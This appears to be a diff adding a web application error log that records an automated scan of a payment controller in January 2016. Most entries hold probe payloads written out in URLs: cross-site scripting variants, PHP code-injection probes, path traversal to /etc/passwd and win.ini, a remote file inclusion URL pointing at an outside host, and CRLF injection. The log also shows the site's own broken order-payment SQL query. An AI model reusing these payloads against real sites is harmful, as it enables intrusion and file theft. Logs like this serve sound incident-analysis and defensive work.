@@ -1,0 +1,251 @@
+[ 2016-01-02T03:23:59+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=pay_result&order_id=$order_id
+ERR: 1054:Unknown column '$order_id' in 'where clause'
+ [ SQL语句 ] : UPDATE `think_order` SET `is_paid`='1',`pay_time`='1451676238' WHERE ( id=$order_id )
+
+[ 2016-01-02T03:24:27+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=pay_result&order_id=$order_id
+ERR: 1054:Unknown column '$order_id' in 'where clause'
+ [ SQL语句 ] : UPDATE `think_order` SET `is_paid`='1',`pay_time`='1451676266' WHERE ( id=$order_id )
+
+[ 2016-01-02T03:30:29+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&id=327
+ERR: 非法操作:PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+[ 2016-01-02T03:31:05+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&a=join&id=327
+ERR: 无法加载控制器:AmF2YXNjcmlwdDpwcm9tcHQoMTExKTt4
+
+[ 2016-01-02T03:31:32+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&id=327
+ERR: 非法操作:amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4
+
+[ 2016-01-02T03:31:50+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Payi1153540i&a=join&id=327
+ERR: 无法加载控制器:Payi1153540i
+
+[ 2016-01-02T03:32:02+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=joini1153540i&id=327
+ERR: 非法操作:joini1153540i
+
+[ 2016-01-02T03:32:11+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=%3CscRipt%3E8976%3C/sCript%3E&a=join&id=327
+ERR: 无法加载控制器:8976
+
+[ 2016-01-02T03:32:14+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=%3CscRipt%3E8976%3C/sCript%3E&id=327
+ERR: 非法操作:8976
+
+[ 2016-01-02T03:32:23+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay31'13%2242%3C24%3E99&a=join&id=327
+ERR: 无法加载控制器:Pay31'13"4299
+
+[ 2016-01-02T03:32:26+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join31'13%2242%3C24%3E99&id=327
+ERR: 非法操作:join31'13"4299
+
+[ 2016-01-02T03:32:46+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay'+onmouseover=3+d='&a=join&id=327
+ERR: 无法加载控制器:Pay' onmouseover=3 d='
+
+[ 2016-01-02T03:32:49+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join'+onmouseover=3+d='&id=327
+ERR: 非法操作:join' onmouseover=3 d='
+
+[ 2016-01-02T03:32:58+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay%22+onmouseover=3+d=%22&a=join&id=327
+ERR: 无法加载控制器:Pay" onmouseover=3 d="
+
+[ 2016-01-02T03:33:01+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join%22+onmouseover=3+d=%22&id=327
+ERR: 非法操作:join" onmouseover=3 d="
+
+[ 2016-01-02T03:33:11+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay%20onmouseover=3%20d&a=join&id=327
+ERR: 无法加载控制器:Pay onmouseover=3 d
+
+[ 2016-01-02T03:33:14+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join%20onmouseover=3%20d&id=327
+ERR: 非法操作:join onmouseover=3 d
+
+[ 2016-01-02T03:33:23+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay'+style=x:expression(a=1)+d='&a=join&id=327
+ERR: 无法加载控制器:Pay' style=x:expression(a=1) d='
+
+[ 2016-01-02T03:33:26+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join'+style=x:expression(a=1)+d='&id=327
+ERR: 非法操作:join' style=x:expression(a=1) d='
+
+[ 2016-01-02T03:33:35+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay%22+style=x:expression(a=1)+d=%22&a=join&id=327
+ERR: 无法加载控制器:Pay" style=x:expression(a=1) d="
+
+[ 2016-01-02T03:33:38+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join%22+style=x:expression(a=1)+d=%22&id=327
+ERR: 非法操作:join" style=x:expression(a=1) d="
+
+[ 2016-01-02T03:33:47+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=%20style=x:expression(a=1)%20d&a=join&id=327
+ERR: 无法加载控制器: style=x:expression(a=1) d
+
+[ 2016-01-02T03:33:50+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=%20style=x:expression(a=1)%20d&id=327
+ERR: 非法操作: style=x:expression(a=1) d
+
+[ 2016-01-02T03:33:59+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay'%20%3C/sCript%3E%3CscRipt%3E8976%3C/sCript%3Ed='&a=join&id=327
+ERR: 无法加载控制器:Pay' 8976d='
+
+[ 2016-01-02T03:34:05+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join'%20%3C/sCript%3E%3CscRipt%3E8976%3C/sCript%3Ed='&id=327
+ERR: 非法操作:join' 8976d='
+
+[ 2016-01-02T03:34:14+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay%22%20%3C/sCript%3E%3CscRipt%3E8976%3C/sCript%3Ed=%22&a=join&id=327
+ERR: 无法加载控制器:Pay" 8976d="
+
+[ 2016-01-02T03:34:20+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join%22%20%3C/sCript%3E%3CscRipt%3E8976%3C/sCript%3Ed=%22&id=327
+ERR: 非法操作:join" 8976d="
+
+[ 2016-01-02T03:34:29+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay%20%3C/sCript%3E%3CscRipt%3E8976%3C/sCript%3Ed&a=join&id=327
+ERR: 无法加载控制器:Pay 8976d
+
+[ 2016-01-02T03:34:32+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join%20%3C/sCript%3E%3CscRipt%3E8976%3C/sCript%3Ed&id=327
+ERR: 非法操作:join 8976d
+
+[ 2016-01-02T03:34:44+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay%20%3C/sCript/%3E%3CscRipt%3Ealert(9876)%3C/sCript/%3E//&a=join&id=327
+ERR: 无法加载控制器:Pay alert(9876)//
+
+[ 2016-01-02T03:34:47+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=join%20%3C/sCript/%3E%3CscRipt%3Ealert(9876)%3C/sCript/%3E//&id=327
+ERR: 非法操作:join alert(9876)//
+
+[ 2016-01-02T03:34:59+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=javascript:alert1987&a=join&id=327
+ERR: 无法加载控制器:Javascript:alert1987
+
+[ 2016-01-02T03:35:02+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=javascript:alert1987&id=327
+ERR: 非法操作:javascript:alert1987
+
+[ 2016-01-02T03:35:14+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=8314'%224138&a=join&id=327
+ERR: 无法加载控制器:8314'"4138
+
+[ 2016-01-02T03:35:20+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=8314'%224138&id=327
+ERR: 非法操作:8314'"4138
+
+[ 2016-01-02T03:35:29+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=);9527();//&a=join&id=327
+ERR: 无法加载控制器:);9527();//
+
+[ 2016-01-02T03:35:32+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=);9527();//&id=327
+ERR: 非法操作:);9527();//
+
+[ 2016-01-02T03:35:42+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=%253CScRiPt%253Ewindow.a%3D%3D1%3F1%3Aalert%28a%3D1%29%253C%2FScRiPt%253E&a=join&id=327
+ERR: 无法加载控制器:%3CScRiPt%3Ewindow.a==1?1:alert(a=1)%3C/ScRiPt%3E
+
+[ 2016-01-02T03:35:45+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=%253CScRiPt%253Ewindow.a%3D%3D1%3F1%3Aalert%28a%3D1%29%253C%2FScRiPt%253E&id=327
+ERR: 非法操作:%3CScRiPt%3Ewindow.a==1?1:alert(a=1)%3C/ScRiPt%3E
+
+[ 2016-01-02T03:36:00+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=%2B%2F%76%2F%25%32%30%2B%41%44%77%2D%73%63%72%69%70%74%2B%41%44%34%2D%61%6C%65%72%74%28%31%39%38%29%2B%41%44%77%2D%2F%73%63%72%69%70%74%2B%41%44%34%2D&a=join&id=327
+ERR: 无法加载控制器:+/v/%20+ADw-script+AD4-alert(198)+ADw-/script+AD4-
+
+[ 2016-01-02T03:36:03+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=%2B%2F%76%2F%25%32%30%2B%41%44%77%2D%73%63%72%69%70%74%2B%41%44%34%2D%61%6C%65%72%74%28%31%39%38%29%2B%41%44%77%2D%2F%73%63%72%69%70%74%2B%41%44%34%2D&id=327
+ERR: 非法操作:+/v/%20+ADw-script+AD4-alert(198)+ADw-/script+AD4-
+
+[ 2016-01-02T03:36:16+08:00 ] 121.42.0.62 /wml/index.php?m=Home&c='-document.write(2313333+5829313)-'&a=join&id=327
+ERR: 无法加载控制器:'-document.write(2313333 5829313)-'
+
+[ 2016-01-02T03:36:18+08:00 ] 121.42.0.66 /wml/index.php?m=Home&c=Pay&a='-document.write(2313333+5829313)-'&id=327
+ERR: 非法操作:'-document.write(2313333 5829313)-'
+
+[ 2016-01-02T03:36:30+08:00 ] 121.42.0.57 /wml/index.php?m=Home&c=expression(document.write(2313333+5829313));x:&a=join&id=327
+ERR: 无法加载控制器:Expression(document.write(2313333 5829313));x:
+
+[ 2016-01-02T03:36:33+08:00 ] 121.42.0.55 /wml/index.php?m=Home&c=Pay&a=expression(document.write(2313333+5829313));x:&id=327
+ERR: 非法操作:expression(document.write(2313333 5829313));x:
+
+[ 2016-01-02T03:37:08+08:00 ] 121.42.0.67 /wml/index.php?m=Home&c=Pay&a=pay_result&order_id=$order_id
+ERR: 1054:Unknown column '$order_id' in 'where clause'
+ [ SQL语句 ] : UPDATE `think_order` SET `is_paid`='1',`pay_time`='1451677027' WHERE ( id=$order_id )
+
+[ 2016-01-02T03:37:46+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=pay_result&order_id=$order_id
+ERR: 1054:Unknown column '$order_id' in 'where clause'
+ [ SQL语句 ] : UPDATE `think_order` SET `is_paid`='1',`pay_time`='1451677065' WHERE ( id=$order_id )
+
+[ 2016-01-02T04:01:38+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&a=join&id=327
+ERR: 无法加载控制器:${@print(md5(this_is_a_test_string))}
+
+[ 2016-01-02T04:01:44+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&id=327
+ERR: 非法操作:${@print(md5(this_is_a_test_string))}
+
+[ 2016-01-02T04:02:02+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&a=join&id=327
+ERR: 无法加载控制器:${@print(md5(this_is_a_test_string))}\
+
+[ 2016-01-02T04:02:05+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&id=327
+ERR: 非法操作:${@print(md5(this_is_a_test_string))}\
+
+[ 2016-01-02T04:06:29+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&a=join&id=327
+ERR: 无法加载控制器:Print(md5(this_is_a_test_string));die();/*
+
+[ 2016-01-02T04:06:32+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&id=327
+ERR: 非法操作:print(md5(this_is_a_test_string));die();/*
+
+[ 2016-01-02T04:10:59+08:00 ] 121.42.0.54 /wml/index.php?m=Home&c=Pay'%22%3E%3Ciframe%20onload=alert()%3E&a=join&id=327
+ERR: 无法加载控制器:Pay'">
+
+[ 2016-01-02T04:13:06+08:00 ] 121.42.0.67 /wml/index.php?m=Home&c=Pay&a=join'%22%3E%3Ciframe%20onload=alert()%3E&id=327
+ERR: 非法操作:join'">
+
+[ 2016-01-02T04:17:08+08:00 ] 121.42.0.57 /wml/index.php?m=Home&c=Pay'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&a=join&id=327
+ERR: 无法加载控制器:Pay'">
+
+[ 2016-01-02T04:17:09+08:00 ] 121.42.0.55 /wml/index.php?m=Home&c=Pay&a=join'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&id=327
+ERR: 非法操作:join'">
+
+[ 2016-01-02T04:17:54+08:00 ] 121.42.0.65 /wml/index.php?m=Home&c=Pay'%22%3E%3Csvg%20onload=prompt()%3E&a=join&id=327
+ERR: 无法加载控制器:Pay'">
+
+[ 2016-01-02T04:17:57+08:00 ] 121.42.0.56 /wml/index.php?m=Home&c=Pay&a=join'%22%3E%3Csvg%20onload=prompt()%3E&id=327
+ERR: 非法操作:join'">
+
+[ 2016-01-02T04:18:09+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=%2Fetc%2Fpasswd&a=join&id=327
+ERR: 无法加载控制器:/etc/passwd
+
+[ 2016-01-02T04:18:12+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=%2Fetc%2Fpasswd&id=327
+ERR: 非法操作:/etc/passwd
+
+[ 2016-01-02T04:18:22+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&a=join&id=327
+ERR: 无法加载控制器:../../../../../../../../etc/passwd
+
+[ 2016-01-02T04:18:25+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&id=327
+ERR: 非法操作:../../../../../../../../etc/passwd
+
+[ 2016-01-02T04:18:35+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&a=join&id=327
+ERR: 无法加载控制器:../../../../../../../../etc/passwd.jpg
+
+[ 2016-01-02T04:18:38+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&id=327
+ERR: 非法操作:../../../../../../../../etc/passwd.jpg
+
+[ 2016-01-02T04:18:50+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&a=join&id=327
+ERR: 无法加载控制器:../../../../../../../../../../etc/passwd%00
+
+[ 2016-01-02T04:18:54+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&id=327
+ERR: 非法操作:../../../../../../../../../../etc/passwd%00
+
+[ 2016-01-02T04:19:06+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&a=join&id=327
+ERR: 无法加载控制器:../../../../../../../../windows/win.ini
+
+[ 2016-01-02T04:19:10+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&id=327
+ERR: 非法操作:../../../../../../../../windows/win.ini
+
+[ 2016-01-02T04:19:21+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&a=join&id=327
+ERR: 无法加载控制器:../../../../../../../../windows/win.ini.jpg
+
+[ 2016-01-02T04:19:25+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&id=327
+ERR: 非法操作:../../../../../../../../windows/win.ini.jpg
+
+[ 2016-01-02T04:19:47+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=http://120.26.55.211/s.txt&a=join&id=327
+ERR: 无法加载控制器:Http://120.26.55.211/s.txt
+
+[ 2016-01-02T04:19:50+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=http://120.26.55.211/s.txt&id=327
+ERR: 非法操作:http://120.26.55.211/s.txt
+
+[ 2016-01-02T04:20:00+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=http%3A%2F%2F120.26.55.211%2Fs.txt&a=join&id=327
+ERR: 无法加载控制器:Http://120.26.55.211/s.txt
+
+[ 2016-01-02T04:20:04+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=http%3A%2F%2F120.26.55.211%2Fs.txt&id=327
+ERR: 非法操作:http://120.26.55.211/s.txt
+
+[ 2016-01-02T04:20:13+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=a_long_name_file_not_exist&a=join&id=327
+ERR: 无法加载控制器:A_long_name_file_not_exist
+
+[ 2016-01-02T04:20:16+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=a_long_name_file_not_exist&id=327
+ERR: 非法操作:a_long_name_file_not_exist
+
+[ 2016-01-02T04:20:38+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=hello%0D%0Aworld%3A111&a=join&id=327
+ERR: 无法加载控制器:Hello
+world:111
+
+[ 2016-01-02T04:20:42+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=hello%0D%0Aworld%3A111&id=327
+ERR: 非法操作:hello
+world:111
+
+[ 2016-01-02T04:20:53+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=hello%0A%0Dworld&a=join&id=327
+ERR: 无法加载控制器:Hello
+world
+
+[ 2016-01-02T04:20:57+08:00 ] 121.42.0.16 /wml/index.php?m=Home&c=Pay&a=hello%0A%0Dworld&id=327
+ERR: 非法操作:hello
+world
+
